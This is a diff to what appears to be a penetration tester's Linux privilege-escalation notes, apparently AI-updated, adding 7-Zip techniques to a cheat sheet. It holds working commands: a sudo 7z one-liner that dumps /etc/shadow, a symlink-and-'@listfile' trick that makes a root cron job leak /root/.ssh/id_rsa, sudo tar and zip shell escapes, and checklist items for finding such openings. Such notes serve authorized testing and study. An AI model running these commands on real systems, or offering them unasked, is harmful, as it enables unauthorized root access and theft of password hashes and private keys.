@@ -253,6 +253,11 @@ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/ba
 # zip
 sudo zip /tmp/exploit.zip /tmp/exploit -T --unzip-command="sh -c /bin/bash"
 
+# 7z / 7za / 7zr — arbitrary file read as root (tars the file to stdout and back)
+LFILE=/etc/shadow; sudo 7z a -ttar -an -so "$LFILE" | 7z e -ttar -si -so
+#   ^ needs full argv control. If instead a FIXED root `7z a archive *` globs a dir you
+#     can write, plant a `@symlink` listfile — see [[Tools/File Transfer/7-Zip|7-Zip]].
+
 # bash (if version allows -p to preserve SUID)
 sudo bash -p
 ```
@@ -479,6 +484,8 @@ chmod +x shell.sh
 ```
 
 Works with: `tar`, `rsync`, `chown`, `chmod`
+
+> [!tip] **`7z`/`7za` wildcard → arbitrary file read.** If the root job archives with 7-Zip (`7z a backup.zip *`) rather than tar, the primitive is different: a filename beginning with **`@`** is read as a *listfile*. Plant `ln -s /root/.ssh/id_rsa id_rsa; touch @id_rsa` at the **top level** of the globbed dir → root's 7z reads the key and echoes it in `... : No more files` errors = file read as root. The `@file` must be a direct glob argument (a subdir plant is recursed as content, no leak). Full treatment, the `--`/`-snl`/version caveats, and the Windows equivalents: [[Tools/File Transfer/7-Zip|7-Zip]].
 
 ### Privileged process, attacker-controlled input
 
@@ -1214,7 +1221,8 @@ CRON JOBS
 [ ] Run pspy64 — catch cron jobs not visible in crontab
 [ ] Check if scripts called by cron are writable
 [ ] Check cron PATH for writable dirs before /usr/bin
-[ ] Check for wildcard usage in cron commands (tar, rsync)
+[ ] Check for wildcard usage in cron commands (tar, rsync, chown, chmod, 7z)
+[ ] Root job archives with 7z over a writable dir? → @listfile file-read (see 7-Zip note)
 
 WRITABLE SENSITIVE FILES
 [ ] ls -la /etc/passwd /etc/shadow /etc/sudoers
@@ -1261,5 +1269,5 @@ KERNEL (last resort — can panic the host)
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-28*
+*Updated: 2026-09-01*
 *Model: claude-opus-5*
